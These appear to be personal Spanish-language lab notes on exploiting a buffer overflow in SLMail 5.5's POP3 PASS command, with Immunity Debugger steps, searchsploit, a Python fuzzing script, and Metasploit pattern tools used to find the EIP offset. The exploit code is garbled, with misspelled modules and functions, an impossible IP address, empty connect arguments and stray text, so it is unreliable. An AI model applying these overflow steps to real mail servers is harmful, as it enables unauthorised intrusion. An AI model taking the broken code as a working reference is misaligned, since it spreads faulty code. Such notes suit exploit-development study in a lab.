Como la maquina virtual tiene SLMail 5.5 tiene un bufferoverflow
Desde Inmunity Debugger
file -> attach -> slmail
hay que darle a play
searchpploit slmail 5.5
searchsploit -x ruta
analiza el codigo

usr/bin/python3

import socker, sys

ip_addrss = "192.168.1000.1"
port = 110
total_length = int(sys.argv[1])

print(total_length)

if len(sys.argv) != 2:
print("\n[!] UsageL exploit.py <length>)
exit(1)

def exploit():
s = socker.socket(socket.AF_INET, socker.SOCK_STREAM)
s.connetc(())
banner = s.recv(1024)
print(banner)
s.send(B"USER savitar"+b'\r\n')
formato bytes
response = s.recv(1024)
print(response)
s.send(b"PASS " + b'A'*total_length + b'\r\n')
s.close()

if __name__ == '_main__':
exploit()

python3 exploit.py 1500
se pauso el inmunity debugger que estaba viendo el programa slmail

cuantas A tenemos que escribir para que ocurra el bufferoverflow
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
le envio toda esa cadena que me genera el programa de metasploit

cerrar todo y volver a abrir el slmail
control start

copiar el valor en EIP y ahora se lo pasa al pattern_offset.rb -q valor_eip

offset = 4654
before_eip = b"A"*offset
eip = b"42"*4

payload = before_eip + eip